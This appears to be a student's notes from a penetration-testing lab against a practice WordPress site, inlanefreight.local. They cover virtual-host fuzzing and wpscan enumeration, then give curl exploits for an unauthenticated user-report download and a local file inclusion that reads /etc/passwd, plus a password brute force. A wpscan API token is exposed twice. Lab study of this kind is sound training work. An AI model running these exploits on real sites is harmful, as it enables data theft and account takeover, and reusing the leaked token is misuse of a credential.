___

# Vhost enum

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u 'http://inlanefreight.local' -H 'Host: FUZZ.inlanefreight.local' -fs 15189
```

```bash
whatweb blog.inlanefreight.local

WordPress[5.1.6]
```
# Wordpress

```bash
wpscan --url http://blog.inlanefreight.local --enumerate --api-token 5L1iakB9rnC4xBx5MHL1Tt42iwkbdFJsWDs3pd0ZjUY
```


WordPress theme in use: twentynineteen

Upload directory has listing enabled: http://blog.inlanefreight.local/wp-content/uploads/

Plugin(s) Identified:    
- email-subscribers

UnauthenticatedFile Download 
https://www.exploit-db.com/exploits/48698

```bash
curl 'http://blog.inlanefreight.local/wp-admin/admin.php?page=download_report&report=users&status=all'
```

- site-editor

Local File Inclusion (LFI)
https://www.exploit-db.com/exploits/44340

```bash
curl 'http://blog.inlanefreight.local/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd'
```

- the-events-calendar

User(s) Identified:  
- erika  
- admin  
- Charlie Wiggins

# Login brute force

```bash
wpscan  --url http://blog.inlanefreight.local/ -U erika --passwords /usr/share/seclists/rockyou.txt --api-token 5L1iakB9rnC4xBx5MHL1Tt42iwkbdFJsWDs3pd0ZjUY
```